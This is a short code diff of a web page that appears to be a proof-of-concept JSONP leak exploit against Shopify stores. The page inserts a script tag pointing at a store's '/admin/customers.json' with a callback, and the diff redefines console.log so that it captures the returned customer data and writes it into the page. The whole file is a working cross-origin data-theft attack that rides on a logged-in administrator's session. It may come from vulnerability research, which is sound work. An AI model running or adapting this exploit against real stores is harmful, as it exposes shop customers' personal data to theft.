@@ -6,9 +6,9 @@ var leak = function(){
   x.src=document.getElementById('base').value+"/admin/customers.json?callback=leak_issues"
   document.body.appendChild(x)
 }
-var leak_issues = function(g){
+var console = {log:function(g){
   document.getElementById('result').innerHTML = JSON.stringify(g)
-}
+}}
 </script>
 <form onsubmit="leak(); return false;">
 <input id="base" name="base" placeholder="https://hahaetotest.myshopify.com">
